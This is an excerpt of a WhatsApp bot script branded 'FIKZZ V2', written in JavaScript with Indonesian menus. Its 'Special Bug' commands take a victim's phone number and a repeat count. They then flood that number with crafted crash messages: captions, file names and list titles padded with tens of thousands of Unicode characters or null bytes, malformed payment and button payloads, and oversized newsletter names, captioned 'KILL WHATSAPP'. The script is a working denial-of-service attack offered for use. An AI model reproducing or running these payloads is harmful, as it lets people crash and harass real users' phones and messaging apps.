...
if (command) {
console.log("");
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Pesan WhatsApp! 🚀`)));
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"FIKZZ V2💀",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `FIKZZ V2 💀`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
        ...
        'message': {
          ...
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            ...
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"FIKZZ V2 💀\".repeat(50000),\"url\":\"https://wa.me/6283874475834\",\"merchant_url\":\"https://www.google.com\"}"
              }],
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "FIKZZ V2 💀",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b37b629673f61aeedee0a.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `FIKZZ V2💀`+"ྦྷ".repeat(60000),
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "FIKZZ V2💀" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'FIKZZ V2💀', url : , merchant_url :  }"
            }],
                        ...
                        nativeFlowMessage: {
                            buttons: [
                                ...
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : 'FIKZZ V2 💀', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `FIKZZ V2 💀`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://whatsapp.com/channel/0029ValsySRAu3aTwuMiUi0A`}}}, { quoted:m})} 
...
title: `© Alwaysfikzz - BDS`,
body: `Halo ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: rxhlimage,
sourceUrl: `https://whatsapp.com/channel/0029ValsySRAu3aTwuMiUi0A`,
mediaUrl: `https://whatsapp.com/channel/0029ValsySRAu3aTwuMiUi0A`
}
},
text: teks
}, {
...
"newsletterJid": '120363316265977402@newsletter',
"newsletterName": 'FIKZZ V2',
"serverMessageId": 1
},
},
"header": {
...
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029ValsySRAu3aTwuMiUi0A\",\"merchant_url\":\"https://whatsapp.com/channel/0029ValsySRAu3aTwuMiUi0A\"}"
}
],
"messageParamsJson": ""
}
...
┏❐   \`Special Bug\`
┃
┃⭔ ${prefix}fikzbug *628xxx|Amount*
┃⭔ ${prefix}fikzkeren *628xxx|Amount*
┃⭔ ${prefix}fikzganteng *628xxx|Amount*
┃⭔ ${prefix}fikzios *628xxx|Amount*
┃⭔ ${prefix}fikzandro *628xxx|Amount*
┃
┗❐
...
"forwardedNewsletterMessageInfo": {
"newsletterJid": '120363316265977402@newsletter',
"newsletterName": 'fikzz 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫',
"serverMessageId": 1
},
},
"header": {
...
mediaType:  1,
mediaUrl: 'https://wa.me/6282223235909',
title: `fikzz 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`,
sourceUrl: `https://wa.me/6282223235909`, 
thumbnail: rxhlimage
}
}})
break
...
Creator: Alwaysfikzz - BDS
Telegram: t.me/Alwaysfikzz
Base: FIKZZ V2 💀
Versi Bot: V2
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

*SCRIPT DEVELOPED BY FIKZZ OFFICIAL*`
}
...
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
...
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `FIKZZ V2`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await rxhl.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `FIKZZ V2`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
await sleep(500)
rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `FIKZZ V2`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `FIKZZ V2`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
...
hohe = [
  {
   ...
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://youtube.com/@blackdragonsofc",
      merchant_url: "https://youtube.com/@blackdragonsofc"
   })
}
]
ewe = `${menuu}`
...
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {document: slayer07, caption: `BUG FIKZZ 𝐕𝟐 💀` },{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break
...
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029ValsySRAu3aTwuMiUi0A`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
...
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY FIKZZZ`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
...
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY FIKZZ`},{quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}* to number *${Pe}*`)
break
